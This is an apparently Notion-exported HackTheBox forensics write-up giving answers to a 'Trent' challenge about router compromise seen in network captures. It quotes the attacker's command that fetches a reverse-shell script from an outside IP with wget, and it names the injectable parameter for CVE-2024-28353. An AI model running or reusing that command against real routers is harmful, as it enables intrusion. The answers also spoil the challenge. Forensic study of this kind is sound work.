@@ -1,0 +1,688 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Trent - DFIR</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="1fd5f9e8-5fa2-8080-ad6f-f9239966f1d9" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://www.notion.so/icons/lock_gray.svg"/></div><h1 class="page-title"><strong>Trent - DFIR</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/network_gray.svg" style="width:14px;height:14px;display:block"/></span>Platform</th><td><span class="selected-value select-value-color-green">HackTheBox</span></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/stairs_gray.svg" style="width:14px;height:14px;display:block"/></span>Difficulty</th><td><span class="selected-value select-value-color-yellow">Medium</span></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/categories_gray.svg" style="width:14px;height:14px;display:block"/></span>Category</th><td><span class="selected-value select-value-color-green">Forensics</span><span class="selected-value select-value-color-pink">Network</span></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/knife-kitchen_gray.svg" style="width:14px;height:14px;display:block"/></span>Techniques Used</th><td></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/wrench_gray.svg" style="width:14px;height:14px;display:block"/></span>Tools Used</th><td></td></tr><tr class="property-row property-row-status"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/stairs_gray.svg" style="width:14px;height:14px;display:block"/></span>Status</th><td><span class="status-value select-value-color-gray"><div class="status-dot status-dot-color-gray"></div>Not Started</span></td></tr></tbody></table></header><div class="page-body"><p id="1fd5f9e8-5fa2-8072-bbb4-ff1474430df9" class=""><mark class="highlight-red">Sherlock Scenario :  </mark><strong>The SOC team has identified suspicious lateral movement targeting router firmware from within the network. Anomalous traffic patterns and command execution have been detected on the router, indicating that an attacker already inside the network has gained unauthorized access and is attempting further exploitation. You will be given network traffic logs from one of the impacted machines. Your task is to conduct a thorough investigation to unravel the attacker&#x27;s Techniques, Tactics, and Procedures (TTPs).</strong></p><p id="1fe5f9e8-5fa2-80af-8695-fbbb5e918859" class="">
+</p><p id="1fd5f9e8-5fa2-8006-be40-c3f9b90a2d9f" class=""><em>Since we are monitoring the infected router logs look for the incoming traffic IP address.</em></p><p id="1fd5f9e8-5fa2-80aa-a916-fd75e8085140" class=""><mark class="highlight-blue"><strong>Task 1</strong></mark></p><p id="1fd5f9e8-5fa2-80fa-9636-c3b3c4a88c51" class=""><strong>From what IP address did the attacker initially launched their activity?</strong></p><p id="1fd5f9e8-5fa2-8037-ac21-e20673d00104" class=""><mark class="highlight-teal"><strong>Ans: 192.168.10.2</strong></mark></p><p id="1fd5f9e8-5fa2-80f6-bc83-c7bdd08330c8" class=""><em>Since we are monitoring the infected router logs look for the incoming traffic IP address.</em></p><p id="1fd5f9e8-5fa2-804a-925c-c2dd54e68fbc" class=""><em>Filter traffic in Wireshark for HTTP and review all Post requests as there are multiple interesting URL traffic.</em></p><p id="1fe5f9e8-5fa2-808e-9273-dbee28f5ea17" class=""><em>Upon review you will find post requests where the attacker is trying to login to the router. If you follow TCP stream of those requests. You will fins the router Model Name.</em></p><figure id="1fe5f9e8-5fa2-8081-af83-d549082639df" class="image"><a href="task_2.png"><img style="width:768px" src="task_2.png"/></a></figure><p id="1fe5f9e8-5fa2-8026-87e0-c1a650778e3e" class="">
+</p><p id="1fd5f9e8-5fa2-802f-a136-fded122275da" class=""><mark class="highlight-blue"><strong>Task 2</strong></mark></p><p id="1fd5f9e8-5fa2-80ee-8970-c57859256753" class=""><strong>What is the model name of the compromised router?</strong></p><p id="1fd5f9e8-5fa2-808f-b67a-e98b695ecdbf" class=""><mark class="highlight-teal"><strong>Ans: TEW-827DRU</strong></mark></p><p id="1fe5f9e8-5fa2-8007-8629-d88f13a71dbe" class=""><em>If you review all post requests for login with URI  /apply_sec.cgi?csrf_token= you will find two failed requests (11:52:53 and 11:52:40) and a successful  login at 2024-05-01 11:53:27 (remember this is EST and UTC is : 2024-05-01 15:53:27)</em></p><figure id="1fe5f9e8-5fa2-80f4-9e5a-ed32ceb31e9b" class="image"><a href="task_6.png"><img style="width:709.796875px" src="task_6.png"/></a></figure><p id="1fe5f9e8-5fa2-802f-b0f7-cb26c79c1996" class="">
+</p><p id="1fe5f9e8-5fa2-8036-b8b8-c050f2d6295d" class=""><mark class="highlight-blue">Task 3</mark></p><p id="1fd5f9e8-5fa2-80da-b0ac-e6b59a59e16f" class=""><strong>How many failed login attempts did the attacker try before successfully logging into the router?</strong></p><p id="1fd5f9e8-5fa2-8047-a76e-f0e414971993" class=""><mark class="highlight-teal"><strong>Ans: 2</strong></mark></p><p id="1fd5f9e8-5fa2-80c8-9b99-e4f426fbe402" class=""><mark class="highlight-blue"><strong>Task 4</strong></mark></p><p id="1fd5f9e8-5fa2-8083-80fd-fc9b1f44f781" class=""><strong>At what UTC time did the attacker successfully log into the routers web admin interface?</strong></p><p id="1fd5f9e8-5fa2-80bb-a81f-cb519e8e924d" class=""><mark class="highlight-teal"><strong>Ans: 2024-05-01 15:53:27</strong></mark></p><p id="1fe5f9e8-5fa2-80ca-b97d-c86cb548686d" class="">Now lets review the Successful Post request. Right click on the packet → Follow → TCP Stream</p><figure id="1fe5f9e8-5fa2-809f-b77e-c4ad7ef565de" class="image"><a href="task_5.png"><img style="width:709.984375px" src="task_5.png"/></a></figure><p id="1fe5f9e8-5fa2-8017-bc2d-d60e28425532" class="">Y<em>ou can see no password was entered for successful login</em></p><p id="1fd5f9e8-5fa2-8094-95b1-c965c0275840" class=""><mark class="highlight-blue"><strong>Task 5</strong></mark></p><p id="1fd5f9e8-5fa2-8047-8eb3-e6b772d58614" class=""><strong>How many characters long was the password used to log in successfully?</strong></p><p id="1fd5f9e8-5fa2-80e3-a5ad-fdb663b40f95" class=""><mark class="highlight-teal"><strong>Ans: 0</strong></mark></p><p id="1fe5f9e8-5fa2-8031-9041-fa64fad65e9f" class=""><em>Now lets review POST requests after 2024-05-01 11:53:27 and you can find multiple POST requests.</em></p><p id="1fe5f9e8-5fa2-8055-bc80-d12358d6a997" class=""><em>Review each one of them by following TCP stream to understand what is happening.</em></p><p id="1fe5f9e8-5fa2-80af-84d4-decfe1dd978e" class=""><em>As you review you will find every Post request trying to inject values to parameter : “</em><em><strong> usbapps.config.smb_admin_name</strong></em><em>”</em></p><p id="1fe5f9e8-5fa2-8035-a801-d25f37e981db" class=""><em>like these requests tries to inject “</em><em><strong>Whoami” </strong></em><em>and some</em><em><strong> URL </strong></em><em>with</em><em><strong> Wget</strong></em><em> indicating attacker was successful at </em><em><strong>command injection</strong></em></p><figure id="1fe5f9e8-5fa2-802b-be58-f34a76ad75a0" class="image"><a href="task_b.png"><img style="width:709.953125px" src="task_b.png"/></a></figure><figure id="1fe5f9e8-5fa2-8082-a92b-d5b4f08b85b5" class="image"><a href="task_a.png"><img style="width:709.96875px" src="task_a.png"/></a></figure><p id="1fe5f9e8-5fa2-804c-a59d-edb995bafb86" class="">As we can point out that the attacker is using command injection to connect the router to its C2 server.</p><p id="1fd5f9e8-5fa2-8085-bf26-ec7b3c2a684e" class=""><mark class="highlight-blue"><strong>Task 6</strong></mark></p><p id="1fd5f9e8-5fa2-801a-b9f3-c3b32e6dffd4" class=""><strong>What is the current firmware version installed on the compromised router?</strong></p><p id="1fd5f9e8-5fa2-806a-be09-d26cc6c0e8cd" class=""><mark class="highlight-teal"><strong>Ans: 2.10</strong></mark></p><p id="1fd5f9e8-5fa2-8049-ab2a-d0c493cfec4e" class=""><mark class="highlight-blue"><strong>Task 7</strong></mark></p><p id="1fd5f9e8-5fa2-8071-a4d7-d9e62a4001f4" class=""><strong>Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?</strong></p><p id="1fd5f9e8-5fa2-8038-b1ec-fe706d408e2b" class=""><mark class="highlight-teal"><strong>Ans: usbapps.config.smb_admin_name</strong></mark></p><p id="1fe5f9e8-5fa2-80cf-96ef-cd63012c1d2a" class=""><em>Since we Know its a </em><em><strong>TEW-827DRU </strong></em><em>router and a remote code execution is performed lets perform some threat intelligence action look for The router with command injection vulnerabilites.</em></p><p id="1fe5f9e8-5fa2-80df-8abe-cc5b88ed7c0b" class=""><em>You will find this </em><em><mark class="highlight-blue"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28353#match-16536444">https://nvd.nist.gov/vuln/detail/CVE-2024-28353#match-16536444</a></mark></em><em>with CVE and router version number.</em></p><p id="1fd5f9e8-5fa2-8092-997e-c7434d22e90d" class=""><mark class="highlight-blue"><strong>Task 8</strong></mark></p><p id="1fd5f9e8-5fa2-806f-a139-c7ef857c4143" class=""><strong>What is the CVE number associated with the vulnerability that was exploited in this attack?</strong></p><p id="1fd5f9e8-5fa2-80e1-90f9-c9607c48e61c" class=""><mark class="highlight-teal"><strong>Ans: CVE-2024-28353</strong></mark></p><p id="1fd5f9e8-5fa2-803f-94a7-d9ad11c3dc58" class=""><mark class="highlight-blue"><strong>Task 9</strong></mark></p><p id="1fd5f9e8-5fa2-8018-9618-ca29fdcaed3b" class=""><strong>What was the first command the attacker executed by exploiting the vulnerability?</strong></p><p id="1fd5f9e8-5fa2-803e-9e8f-dff988d8b4ce" class=""><mark class="highlight-teal"><strong>Ans: whoami</strong></mark></p><p id="1fd5f9e8-5fa2-800f-bd69-d8ca408181ec" class=""><mark class="highlight-blue"><strong>Task 10</strong></mark></p><p id="1fd5f9e8-5fa2-801c-b455-c7b57d938f8e" class=""><strong>What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?</strong></p><p id="1fd5f9e8-5fa2-8097-92ae-f9ae31e8a546" class=""><mark class="highlight-teal"><strong>Ans: wget </strong></mark><mark class="highlight-teal"><strong><a href="http://35.159.25.253:8000/a1l4m.sh">http://35.159.25.253:8000/a1l4m.sh</a></strong></mark></p><p id="1fe5f9e8-5fa2-80c2-8135-ff128e0e4798" class=""><em>When you reviewed post requests earlier you can find POST requests where the reverse shell failed</em></p><figure id="1fe5f9e8-5fa2-80ec-9824-d71051952458" class="image"><a href="task_7-11.png"><img style="width:709.984375px" src="task_7-11.png"/></a></figure><p id="1fe5f9e8-5fa2-8071-91a5-dfd8fe75a60f" class="">
+</p><p id="1fd5f9e8-5fa2-8081-9654-eae14f7cfcc3" class=""><mark class="highlight-blue"><strong>Task 11</strong></mark></p><p id="1fd5f9e8-5fa2-803b-814c-ec9b97b12dc5" class=""><strong>Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?</strong></p><p id="1fd5f9e8-5fa2-803e-bbfc-d0c24dc4535d" class=""><mark class="highlight-teal"><strong>Ans: Access to this resource is forbidden</strong></mark></p><p id="1fd5f9e8-5fa2-8071-8851-d7114e71323e" class=""><mark class="highlight-blue"><strong>Task 12</strong></mark></p><p id="1fd5f9e8-5fa2-80ce-bfeb-d358704abf19" class=""><strong>What was the IP address and port number of the command and control (C2) server when the actor&#x27;s reverse shell eventually did connect? (IP:Port)</strong></p><p id="1fd5f9e8-5fa2-8085-92c5-e17fa711a37d" class=""><mark class="highlight-teal"><strong>Ans: 35.159.25.253:41143</strong></mark></p><p id="1fd5f9e8-5fa2-80d3-b78c-e3bfc1547cab" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
